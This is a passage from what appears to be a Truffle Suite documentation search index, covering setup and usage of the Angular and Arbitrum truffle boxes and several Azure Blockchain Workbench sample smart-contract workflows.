"boxes/angular-truffle-box/#releasing", "text": "Using the Angular CLI you can build a distributable of your app. Will be placed in dist/ ng build", "title": "Releasing"}, {"location": "boxes/angular-truffle-box/#faq", "text": "Where can I find more documentation? This Truffle box is a union of Truffle and an Angular setup created with Angular CLI . For solidity compilation and Ethereum related issues, try the Truffle documentation . For Angular CLI and typescript issues, refer to the Angular CLI documentation Common errors and their solutions Error Solution Module not found: Error: Can't resolve '../../../../build/contracts/MetaCoin.json' during ng serve Run truffle compile Error: the tx doesn't have the correct nonce. in MetaMask Reset MetaMask: Settings -> Reset Account Error getting balance; see log. in UI, with Error: MetaCoin has not been deployed to detected network (network/artifact mismatch) in browser console Ensure you have started ganache, run truffle migrate and configured MetaMask to point to ganache How do I get this to work on Windows? Possible issues: If you're missing a C++ compiler, run npm install --global --production windows-build-tools in a cmd with administrative rights. If the truffle.js file opens when you're trying to run truffle commands, rename the file to truffle-config.js", "title": "FAQ"}, {"location": "boxes/arbitrum/", "text": "Arbitrum Box \u00b6 Requirements Installation Setup Using the .env File New Configuration File New Directory Structure for Artifacts Arbitrum Compiling Migrating Basic Commands Testing Communication Between Ethereum and Arbitrum Chains Support Table of contents generated with markdown-toc This Truffle Arbitrum Box provides you with the boilerplate structure necessary to start coding for Arbitrum's Ethereum Layer 2 solution. For detailed information on how Arbitrum works, please see the documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Arbitrum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against a variety of Arbitrum test networks. Arbitrum's Layer 2 solution is almost fully compatible with the EVM. You do not need a separate compiler to compile your Solidity contracts. The main difference between the EVM and the Arbitrum chain that developers will notice is that some opcodes are different and concepts such as time and gas are handled a little differently. Developers can use their regular Solidity compiler to compile contracts for Arbitrum. You can see the complete list of differences between the Arbitrum L2 chain and Ethereum here . Requirements \u00b6 The Arbitrum Box has the following requirements: Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account Installation \u00b6 Note that this installation command will only work once the box is published (in the interim you can use truffle unbox https://github.com/truffle-box/arbitrum-box ). $ truffle unbox arbitrum Setup \u00b6 Using the env File \u00b6 You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.arbitrum.js file expects a MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the Arbitrum network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"jar deny prosper gasp flush glass core corn alarm treat leg smart\" INFURA_KEY=\"<Your Infura Project ID>\" GOERLI_MNEMONIC=\"<Your Goerli Mnemonic>\" MAINNET_MNEMONIC=\"<Your Arbitrum Mainnet Mnemonic>\" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local arbitrum network we will run in this Truffle Box. 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] . New Configuration File \u00b6 A new configuration file exists in this project: truffle-config.arbitrum.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Arbitrum contracts and lists several networks for running the Arbitrum Layer 2 network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder. New Directory Structure for Artifacts \u00b6 When you compile or migrate, the resulting json files will be at build/arbitrum-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference! Arbitrum \u00b6 Compiling \u00b6 To compile your Arbitrum contracts, run the following in your terminal: npm run compile:arbitrum This script lets Truffle know to use the truffle-config.arbitrum.js configuration file, which tells Truffle where to store your build artifacts. When adding new contracts to compile, you may find some discrepancies and errors, so please remember to keep an eye on differences between ethereum and Arbitrum ! If you would like to recompile previously compiled contracts, you can manually run this command with truffle compile --config truffle-config.arbitrum.js and add the --all flag. Migrating \u00b6 To migrate on Arbitrum, run: npm run migrate:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) (remember to choose a network from these options!). You have several Arbitrum networks to choose from, prepackaged in this box (note: Layer 1 networks are included in the regular truffle-config.js file, to aid you with further development. But here we'll just go through the Layer 2 deployment options available): arbitrum_local : This network is the default Layer 1/Layer 2 integration provided by Arbitrum for testing your Arbitrum-compatible code. Documentation about this setup can be found here . Please note: Arbitrum is currently changing how running a local Arbitrum node works, and until the changes are complete the local Arbitrum network will not work. We will remove this note once the local node setup has been updated. You will need to install the code for this network in this box in order to use the scripts associated with it. To install it, run npm run installLocalArbitrum . You should only need to run this initiation command once. It will create an arbitrum directory in this project that will house the repository you need. If at any point you want to update to the latest Arbitrum docker image, you can delete your arbitrum directory and run this command again. If you'd rather house the Arbitrum local blockchain outside of this box, see these notes for how to get started doing so. If you wish to use this network, follow these steps, in this order: 1) In a new terminal tab, enter npm run startLocalEthereum . 2) Wait for step #1 to complete. The Arbitrum Layer 2 blockchain depends on the existence of a Layer 1 for proper interoperability. 3) In another new terminal tab, enter npm run startLocalArbitrum . Wait a little while, and you will see the Arbitrum blockchain running and interacting with the Layer 1 simulation from step #1! You are ready to try out deploying your contracts! - arbitrum_testnet : Arbitrum has deployed a testnet to the Rinkeby network. The RPC endpoint is https://arbitrum-rinkeby.infura.io/v3/. In order to access this node for testing, you will need to connect a wallet (we suggest MetaMask ). Save your seed phrase in a .env file as RINKEBY_MNEMONIC . Using an .env file for the mnemonic is safer practice because it is listed in .gitignore and thus will not be committed. * Currently, we have the gasPrice for transactions on Arbitrum Rinkeby set to zero. You should be able to use this network as configured at this time. * In order to set up your MetaMask wallet to connect to the Arbitrum Rinkeby network, you will need to create a custom RPC network in your wallet. You can find detailed steps for this process here . You will need the following information: - RPC Url: https://arbitrum-rinkeby.infura.io/v3/ + <your infura key> - chain id: 421611 arbitrum_mainnet : This is the mainnet for Arbitrum's Layer 2 solution. You will need to connect your wallet to the Arbitrum mainnet RPC network, located at https://arbitrum-mainnet.infura.io/v3/ Layer 1 networks are included in the truffle-config.js file, but it is not necessary to deploy your base contracts to Layer 1 right now. Eventually, you will likely have a Layer 2 contract that you want to connect with a Layer 1 contract. One example is an ERC20 contract that is deployed on an Arbitrum network. At some point the user will wish to withdraw their funds into Ethereum. There will need to be a contract deployed on Layer 1 that can receive the message from Layer 2 to mint the appropriate tokens on Layer 1 for the user. More information on this system can be found here . If you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.arbitrum.js --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) and add the --reset flag. Basic Commands \u00b6 The code here will allow you to compile, migrate, and test your code against an Arbitrum instance. The following commands can be run (more details on each can be found in the next section): To compile: npm run compile:arbitrum To migrate: npm run migrate:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) To test: npm run test:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) Testing \u00b6 Currently, this box supports testing via Javascript/TypeScript tests. In order to run the test currently in the boilerplate, use the following command: npm run test:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) Remember that there are some differences between Arbitrum and Ethereum, and refer to the Arbitrum documentation if you run into test failures. Communication Between Ethereum and Arbitrum Chains \u00b6 The information above should allow you to deploy to an Arbitrum Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 using Layer 2, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Arbitrum ecosystem . Keep an eye out for additional Truffle tooling and examples that elucidate this second step to full Arbitrum integration! Support \u00b6 Support for this box is available via the Truffle community available here .", "title": "Arbitrum Box"}, {"location": "boxes/arbitrum/#arbitrum-box", "text": "Requirements Installation Setup Using the .env File New Configuration File New Directory Structure for Artifacts Arbitrum Compiling Migrating Basic Commands Testing Communication Between Ethereum and Arbitrum Chains Support Table of contents generated with markdown-toc This Truffle Arbitrum Box provides you with the boilerplate structure necessary to start coding for Arbitrum's Ethereum Layer 2 solution. For detailed information on how Arbitrum works, please see the documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Arbitrum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against a variety of Arbitrum test networks. Arbitrum's Layer 2 solution is almost fully compatible with the EVM. You do not need a separate compiler to compile your Solidity contracts. The main difference between the EVM and the Arbitrum chain that developers will notice is that some opcodes are different and concepts such as time and gas are handled a little differently. Developers can use their regular Solidity compiler to compile contracts for Arbitrum. You can see the complete list of differences between the Arbitrum L2 chain and Ethereum here .", "title": "Arbitrum Box"}, {"location": "boxes/arbitrum/#requirements", "text": "The Arbitrum Box has the following requirements: Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account", "title": "Requirements"}, {"location": "boxes/arbitrum/#installation", "text": "Note that this installation command will only work once the box is published (in the interim you can use truffle unbox https://github.com/truffle-box/arbitrum-box ). $ truffle unbox arbitrum", "title": "Installation"}, {"location": "boxes/arbitrum/#setup", "text": "", "title": "Setup"}, {"location": "boxes/arbitrum/#using-the-env-file", "text": "You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.arbitrum.js file expects a MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the Arbitrum network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"jar deny prosper gasp flush glass core corn alarm treat leg smart\" INFURA_KEY=\"<Your Infura Project ID>\" GOERLI_MNEMONIC=\"<Your Goerli Mnemonic>\" MAINNET_MNEMONIC=\"<Your Arbitrum Mainnet Mnemonic>\" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local arbitrum network we will run in this Truffle Box. 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] .", "title": "Using the env File"}, {"location": "boxes/arbitrum/#new-configuration-file", "text": "A new configuration file exists in this project: truffle-config.arbitrum.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Arbitrum contracts and lists several networks for running the Arbitrum Layer 2 network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder.", "title": "New Configuration File"}, {"location": "boxes/arbitrum/#new-directory-structure-for-artifacts", "text": "When you compile or migrate, the resulting json files will be at build/arbitrum-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference!", "title": "New Directory Structure for Artifacts"}, {"location": "boxes/arbitrum/#arbitrum", "text": "", "title": "Arbitrum"}, {"location": "boxes/arbitrum/#compiling", "text": "To compile your Arbitrum contracts, run the following in your terminal: npm run compile:arbitrum This script lets Truffle know to use the truffle-config.arbitrum.js configuration file, which tells Truffle where to store your build artifacts. When adding new contracts to compile, you may find some discrepancies and errors, so please remember to keep an eye on differences between ethereum and Arbitrum ! If you would like to recompile previously compiled contracts, you can manually run this command with truffle compile --config truffle-config.arbitrum.js and add the --all flag.", "title": "Compiling"}, {"location": "boxes/arbitrum/#migrating", "text": "To migrate on Arbitrum, run: npm run migrate:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) (remember to choose a network from these options!). You have several Arbitrum networks to choose from, prepackaged in this box (note: Layer 1 networks are included in the regular truffle-config.js file, to aid you with further development. But here we'll just go through the Layer 2 deployment options available): arbitrum_local : This network is the default Layer 1/Layer 2 integration provided by Arbitrum for testing your Arbitrum-compatible code. Documentation about this setup can be found here . Please note: Arbitrum is currently changing how running a local Arbitrum node works, and until the changes are complete the local Arbitrum network will not work. We will remove this note once the local node setup has been updated. You will need to install the code for this network in this box in order to use the scripts associated with it. To install it, run npm run installLocalArbitrum . You should only need to run this initiation command once. It will create an arbitrum directory in this project that will house the repository you need. If at any point you want to update to the latest Arbitrum docker image, you can delete your arbitrum directory and run this command again. If you'd rather house the Arbitrum local blockchain outside of this box, see these notes for how to get started doing so. If you wish to use this network, follow these steps, in this order: 1) In a new terminal tab, enter npm run startLocalEthereum . 2) Wait for step #1 to complete. The Arbitrum Layer 2 blockchain depends on the existence of a Layer 1 for proper interoperability. 3) In another new terminal tab, enter npm run startLocalArbitrum . Wait a little while, and you will see the Arbitrum blockchain running and interacting with the Layer 1 simulation from step #1! You are ready to try out deploying your contracts! - arbitrum_testnet : Arbitrum has deployed a testnet to the Rinkeby network. The RPC endpoint is https://arbitrum-rinkeby.infura.io/v3/. In order to access this node for testing, you will need to connect a wallet (we suggest MetaMask ). Save your seed phrase in a .env file as RINKEBY_MNEMONIC . Using an .env file for the mnemonic is safer practice because it is listed in .gitignore and thus will not be committed. * Currently, we have the gasPrice for transactions on Arbitrum Rinkeby set to zero. You should be able to use this network as configured at this time. * In order to set up your MetaMask wallet to connect to the Arbitrum Rinkeby network, you will need to create a custom RPC network in your wallet. You can find detailed steps for this process here . You will need the following information: - RPC Url: https://arbitrum-rinkeby.infura.io/v3/ + <your infura key> - chain id: 421611 arbitrum_mainnet : This is the mainnet for Arbitrum's Layer 2 solution. You will need to connect your wallet to the Arbitrum mainnet RPC network, located at https://arbitrum-mainnet.infura.io/v3/ Layer 1 networks are included in the truffle-config.js file, but it is not necessary to deploy your base contracts to Layer 1 right now. Eventually, you will likely have a Layer 2 contract that you want to connect with a Layer 1 contract. One example is an ERC20 contract that is deployed on an Arbitrum network. At some point the user will wish to withdraw their funds into Ethereum. There will need to be a contract deployed on Layer 1 that can receive the message from Layer 2 to mint the appropriate tokens on Layer 1 for the user. More information on this system can be found here . If you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.arbitrum.js --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) and add the --reset flag.", "title": "Migrating"}, {"location": "boxes/arbitrum/#basic-commands", "text": "The code here will allow you to compile, migrate, and test your code against an Arbitrum instance. The following commands can be run (more details on each can be found in the next section): To compile: npm run compile:arbitrum To migrate: npm run migrate:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) To test: npm run test:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet)", "title": "Basic Commands"}, {"location": "boxes/arbitrum/#testing", "text": "Currently, this box supports testing via Javascript/TypeScript tests. In order to run the test currently in the boilerplate, use the following command: npm run test:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) Remember that there are some differences between Arbitrum and Ethereum, and refer to the Arbitrum documentation if you run into test failures.", "title": "Testing"}, {"location": "boxes/arbitrum/#communication-between-ethereum-and-arbitrum-chains", "text": "The information above should allow you to deploy to an Arbitrum Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 using Layer 2, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Arbitrum ecosystem . Keep an eye out for additional Truffle tooling and examples that elucidate this second step to full Arbitrum integration!", "title": "Communication Between Ethereum and Arbitrum Chains"}, {"location": "boxes/arbitrum/#support", "text": "Support for this box is available via the Truffle community available here .", "title": "Support"}, {"location": "boxes/azure-asset-transfer/", "text": "Asset Transfer Sample for Azure Blockchain Workbench \u00b6 Overview \u00b6 The asset transfer smart contract covers the scenario for buying and selling high value assets, which require an inspector and appraiser. Sellers can list their assets by instantiating an asset transfer smart contract. Buyers can make offers by taking an action on the smart contract, and other parties can take actions to inspect or appraise the asset. Once the asset is marked both inspected and appraised, the buyer and seller will confirm the sale again before the contract is set to complete. At each point in the process, all participants have visibility into the state of the contract as it is updated. There are four personas in this demo contract \u2013 the seller as the initiator, and the other three personas (buyer, appraiser, and inspector) as participants. As indicated in the visual above, at certain stages in the contract, there are various actions which participants can take. The logic written in the smart contract will modify the state accordingly based on which actions are taken. Application Roles \u00b6 Name Description Seller A person who owns an asset and wants to sell the asset. Buyer A person who intends to buy the asset being sold by the seller. Inspector A person who is chosen by the buyer to be the inspector of the asset being considered for buying. Appraiser A person who is chosen by the buyer to be the appraiser for the asset being considered for buying. States \u00b6 Name Description Active Indicates that an asset is available for being bought. Offer Placed Indicates a buyer's intention to buy. Pending Inspection Indicates a buyer's request to the Inspector to inspect the asset under consideration. Inspected Indicates the Inspector's approval to buy the asset under consideration. Appraised Indicates the Appraiser's approval to buy the asset under consideration. Notional Acceptance Indicates that both the Inspector and the Appraiser have approved buying the asset under consideration. Seller Accepted Indicates the owner's approval to accept the offer made by the buyer. Buyer Accepted Indicates the buyer's approval for the owner's approval. Accepted Indicates that both the buyer and the seller have agreed to the transfer of the asset under consideration. Terminated Indicates owner's disapproval to continue with selling the asset under consideration. Workflow Details \u00b6 The following state transition diagram articulates the possible flows, and the various transition functions at each state. Each user is only allowed to take certain actions depending on the application role. Instance roles indicate that only the user with the application role assigned to the specific contract is able to take actions on the contract. The happy path highlighted shows in a given asset transfer contract, an instance owner can place an asset up for sale, and a potential buyer can place an offer.\u202fThe two parties can negotiate and once an offer amount is agreed upon, an inspector and an\u202fappraiser\u202fworking for the instance buyer will participate.\u202fAfter their involvement, the buyer and the owner can choose to move forward and ultimately complete the transaction. Application Files \u00b6 AssetTranfer.sol", "title": "Asset Transfer Sample for Azure Blockchain Workbench"}, {"location": "boxes/azure-asset-transfer/#asset-transfer-sample-for-azure-blockchain-workbench", "text": "", "title": "Asset Transfer Sample for Azure Blockchain Workbench"}, {"location": "boxes/azure-asset-transfer/#overview", "text": "The asset transfer smart contract covers the scenario for buying and selling high value assets, which require an inspector and appraiser. Sellers can list their assets by instantiating an asset transfer smart contract. Buyers can make offers by taking an action on the smart contract, and other parties can take actions to inspect or appraise the asset. Once the asset is marked both inspected and appraised, the buyer and seller will confirm the sale again before the contract is set to complete. At each point in the process, all participants have visibility into the state of the contract as it is updated. There are four personas in this demo contract \u2013 the seller as the initiator, and the other three personas (buyer, appraiser, and inspector) as participants. As indicated in the visual above, at certain stages in the contract, there are various actions which participants can take. The logic written in the smart contract will modify the state accordingly based on which actions are taken.", "title": "Overview"}, {"location": "boxes/azure-asset-transfer/#application-roles", "text": "Name Description Seller A person who owns an asset and wants to sell the asset. Buyer A person who intends to buy the asset being sold by the seller. Inspector A person who is chosen by the buyer to be the inspector of the asset being considered for buying. Appraiser A person who is chosen by the buyer to be the appraiser for the asset being considered for buying.", "title": "Application Roles"}, {"location": "boxes/azure-asset-transfer/#states", "text": "Name Description Active Indicates that an asset is available for being bought. Offer Placed Indicates a buyer's intention to buy. Pending Inspection Indicates a buyer's request to the Inspector to inspect the asset under consideration. Inspected Indicates the Inspector's approval to buy the asset under consideration. Appraised Indicates the Appraiser's approval to buy the asset under consideration. Notional Acceptance Indicates that both the Inspector and the Appraiser have approved buying the asset under consideration. Seller Accepted Indicates the owner's approval to accept the offer made by the buyer. Buyer Accepted Indicates the buyer's approval for the owner's approval. Accepted Indicates that both the buyer and the seller have agreed to the transfer of the asset under consideration. Terminated Indicates owner's disapproval to continue with selling the asset under consideration.", "title": "States"}, {"location": "boxes/azure-asset-transfer/#workflow-details", "text": "The following state transition diagram articulates the possible flows, and the various transition functions at each state. Each user is only allowed to take certain actions depending on the application role. Instance roles indicate that only the user with the application role assigned to the specific contract is able to take actions on the contract. The happy path highlighted shows in a given asset transfer contract, an instance owner can place an asset up for sale, and a potential buyer can place an offer.\u202fThe two parties can negotiate and once an offer amount is agreed upon, an inspector and an\u202fappraiser\u202fworking for the instance buyer will participate.\u202fAfter their involvement, the buyer and the owner can choose to move forward and ultimately complete the transaction.", "title": "Workflow Details"}, {"location": "boxes/azure-asset-transfer/#application-files", "text": "AssetTranfer.sol", "title": "Application Files"}, {"location": "boxes/azure-basic-provenance/", "text": "Basic Provenance Sample Application for Azure Blockchain Workbench \u00b6 Overview \u00b6 The Basic Provenance application expresses a workflow for a simple record of ownership or responsibility. The state transition diagram below shows the interactions among the states in this workflow. Application Roles \u00b6 Name Description InitiatingCounterParty The first participant in the supply chain. Counterparty A party to whom responsibility for a product has been assigned. For example, a shipper Owner The organization that owns the product being transported. For example, a manufacturer Observer The individual or organization monitoring the supply chain. For example, a government agency States \u00b6 Name Description Created Indicates that the contract has initiated and tracking is in progress. InTransit Indicates that a Counterparty currently is in possession and responsible for goods being transported. Completed Indicates the product has reached it's intended destination. Workflow Details \u00b6 An instance of the Basic Provenance application's workflow starts in the Created state when an owner wants to begin a process for tracking ownership or responsibility. An owner is also the InitiatingCounterParty since the owner initiates the process for tracking the ownership or responsibility. The state changes to InTransit whenever a new counterparty that can take on the responsibility is identified. The owner in the InitiatingCounterParty role calls a function to transfer responsibility by specifying a counterparty. Upon reaching the InTransit state, the counterparty can transfer the responsibility to another counterparty or the owner can decide to complete the transfers of responsibility and call the Complete function to reach the Completed state. The happy path shown in the transition diagram traces the owner transferring responsibility to a counterparty once and then completing the workflow. Application Files \u00b6 BasicProvenance.json BasicProvenance.sol", "title": "Basic Provenance Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/azure-basic-provenance/#basic-provenance-sample-application-for-azure-blockchain-workbench", "text": "", "title": "Basic Provenance Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/azure-basic-provenance/#overview", "text": "The Basic Provenance application expresses a workflow for a simple record of ownership or responsibility. The state transition diagram below shows the interactions among the states in this workflow.", "title": "Overview"}, {"location": "boxes/azure-basic-provenance/#application-roles", "text": "Name Description InitiatingCounterParty The first participant in the supply chain. Counterparty A party to whom responsibility for a product has been assigned. For example, a shipper Owner The organization that owns the product being transported. For example, a manufacturer Observer The individual or organization monitoring the supply chain. For example, a government agency", "title": "Application Roles"}, {"location": "boxes/azure-basic-provenance/#states", "text": "Name Description Created Indicates that the contract has initiated and tracking is in progress. InTransit Indicates that a Counterparty currently is in possession and responsible for goods being transported. Completed Indicates the product has reached it's intended destination.", "title": "States"}, {"location": "boxes/azure-basic-provenance/#workflow-details", "text": "An instance of the Basic Provenance application's workflow starts in the Created state when an owner wants to begin a process for tracking ownership or responsibility. An owner is also the InitiatingCounterParty since the owner initiates the process for tracking the ownership or responsibility. The state changes to InTransit whenever a new counterparty that can take on the responsibility is identified. The owner in the InitiatingCounterParty role calls a function to transfer responsibility by specifying a counterparty. Upon reaching the InTransit state, the counterparty can transfer the responsibility to another counterparty or the owner can decide to complete the transfers of responsibility and call the Complete function to reach the Completed state. The happy path shown in the transition diagram traces the owner transferring responsibility to a counterparty once and then completing the workflow.", "title": "Workflow Details"}, {"location": "boxes/azure-basic-provenance/#application-files", "text": "BasicProvenance.json BasicProvenance.sol", "title": "Application Files"}, {"location": "boxes/azure-digital-locker/", "text": "Digital Locker Sample Application for Azure Blockchain Marketplace \u00b6 Overview \u00b6 The Digital Locker application expresses a workflow of sharing digitally locked files where the owner of the files controls the access to these files. We illustrate Digital Locker using an example of an owner performing access control to their document held by a bank. The state transition diagram below shows the interactions among the states in this workflow. Application Roles \u00b6 Name Description Owner The owner of the digital asset. BankAgent The keeper of the digital asset. ThirdPartyRequestor A person requesting access to the digital asset. CurrentAuthorizedUser A person authorized to access the digital asset. States \u00b6 Requested Indicates owner's request to make the digital asset available. DocumentReview Indicates that the bank agent has reviewed the owner's request. AvailableToShare Indicates that the bank agent has uploaded the digital asset and the digital asset is available for sharing SharingWithThirdParty Indicates that the owner is reviewing a third party's request to access the digital asset. Terminated Indicates termination of sharing the digital asset. Workflow Details \u00b6 An instance of the Digital Locker application's workflow starts in the Requested state when an Owner requests their bank to begin a process of sharing a document held by the bank. A BankAgent causes the state to transition to DocumentReview by calling the function BeginReviewProcess indicating that the process to review the request has begun. Once the review is complete, the BankAgent then makes the document available by uploading the documents. The AvailableToShare state can be thought of a perpetual state, more on this in a bit. Once the document is available to share, the document can be shared either with a third party that the owner has identified or any random third-party requestor. If the owner specifies the third-party requestor, then the state transitions from AvailableToShare to SharingWithThirdParty. If a random third-party requestor needs access to the document, then that third-party requestor first requests access to the document. At this point, the owner can either accept the request and grant access or reject the request. If the owner rejects the request to the random third-party requestor, then the state goes back to AvailableToShare. If the owner accepts the request to allow the random third-party request to access the document, then the state transitions to SharingWithThirdParty. Once the third-party requestor is done with the document, they can release the lock to the document and the state transitions to AvailableToShare. The owner can also cause the state to transition from SharingWithThirdParty to AvailableToShare when they revoke access from the third-party requestor. Finally, at any time during these transitions the bank agent can decide to terminate the sharing of the document once the document becomes available to share. The happy path shown in the state transition diagram traces a path where the owner grants access to a random third party. Application Files \u00b6 DigitalLocker.json DigitalLocker.sol", "title": "Digital Locker Sample Application for Azure Blockchain Marketplace"}, {"location": "boxes/azure-digital-locker/#digital-locker-sample-application-for-azure-blockchain-marketplace", "text": "", "title": "Digital Locker Sample Application for Azure Blockchain Marketplace"}, {"location": "boxes/azure-digital-locker/#overview", "text": "The Digital Locker application expresses a workflow of sharing digitally locked files where the owner of the files controls the access to these files. We illustrate Digital Locker using an example of an owner performing access control to their document held by a bank. The state transition diagram below shows the interactions among the states in this workflow.", "title": "Overview"}, {"location": "boxes/azure-digital-locker/#application-roles", "text": "Name Description Owner The owner of the digital asset. BankAgent The keeper of the digital asset. ThirdPartyRequestor A person requesting access to the digital asset. CurrentAuthorizedUser A person authorized to access the digital asset.", "title": "Application Roles"}, {"location": "boxes/azure-digital-locker/#states", "text": "Requested Indicates owner's request to make the digital asset available. DocumentReview Indicates that the bank agent has reviewed the owner's request. AvailableToShare Indicates that the bank agent has uploaded the digital asset and the digital asset is available for sharing SharingWithThirdParty Indicates that the owner is reviewing a third party's request to access the digital asset. Terminated Indicates termination of sharing the digital asset.", "title": "States"}, {"location": "boxes/azure-digital-locker/#workflow-details", "text": "An instance of the Digital Locker application's workflow starts in the Requested state when an Owner requests their bank to begin a process of sharing a document held by the bank. A BankAgent causes the state to transition to DocumentReview by calling the function BeginReviewProcess indicating that the process to review the request has begun. Once the review is complete, the BankAgent then makes the document available by uploading the documents. The AvailableToShare state can be thought of a perpetual state, more on this in a bit. Once the document is available to share, the document can be shared either with a third party that the owner has identified or any random third-party requestor. If the owner specifies the third-party requestor, then the state transitions from AvailableToShare to SharingWithThirdParty. If a random third-party requestor needs access to the document, then that third-party requestor first requests access to the document. At this point, the owner can either accept the request and grant access or reject the request. If the owner rejects the request to the random third-party requestor, then the state goes back to AvailableToShare. If the owner accepts the request to allow the random third-party request to access the document, then the state transitions to SharingWithThirdParty. Once the third-party requestor is done with the document, they can release the lock to the document and the state transitions to AvailableToShare. The owner can also cause the state to transition from SharingWithThirdParty to AvailableToShare when they revoke access from the third-party requestor. Finally, at any time during these transitions the bank agent can decide to terminate the sharing of the document once the document becomes available to share. The happy path shown in the state transition diagram traces a path where the owner grants access to a random third party.", "title": "Workflow Details"}, {"location": "boxes/azure-digital-locker/#application-files", "text": "DigitalLocker.json DigitalLocker.sol", "title": "Application Files"}, {"location": "boxes/azure-hello-blockchain/", "text": "Hello Blockchain Sample Application for Azure Blockchain Workbench \u00b6 Overview \u00b6 The Hello Blockchain application expresses a workflow between a person sending a request and a person responding to the request. The state transition diagram below shows the interactions between the states in this workflow. Application Roles \u00b6 Name Description Requestor The party that initiates the \"Hello blockchain!\" request Responder The party that responds to the Requestor States \u00b6 Name Description Request The state that occurs when a request has been made. Respond The state that occurs after a response has been made to the request. Workflow Details \u00b6 An instance of the Hello Blockchain application's workflow starts in the Request state when a Requestor makes a request. The instance transitions to the Respond state when a Responder sends a response. The instance transitions back again to the Request state when the Requestor makes another request. These transitions continue for as long as a Requestor sends a request and a Responder sends a response. Application Files \u00b6 HelloBlockchain.json HelloBlockchain.sol", "title": "Hello Blockchain Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/azure-hello-blockchain/#hello-blockchain-sample-application-for-azure-blockchain-workbench", "text": "", "title": "Hello Blockchain Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/azure-hello-blockchain/#overview", "text": "The Hello Blockchain application expresses a workflow between a person sending a request and a person responding to the request. The state transition diagram below shows the interactions between the states in this workflow.", "title": "Overview"}, {"location": "boxes/azure-hello-blockchain/#application-roles", "text": "Name Description Requestor The party that initiates the \"Hello blockchain!\" request Responder The party that responds to the Requestor", "title": "Application Roles"}, {"location": "boxes/azure-hello-blockchain/#states", "text": "Name Description Request The state that occurs when a request has been made. Respond The state that occurs after a response has been made to the request.", "title": "States"}, {"location": "boxes/azure-hello-blockchain/#workflow-details", "text": "An instance of the Hello Blockchain application's workflow starts in the Request state when a Requestor makes a request. The instance transitions to the Respond state when a Responder sends a response. The instance transitions back again to the Request state when the Requestor makes another request. These transitions continue for as long as a Requestor sends a request and a Responder sends a response.", "title": "Workflow Details"}, {"location": 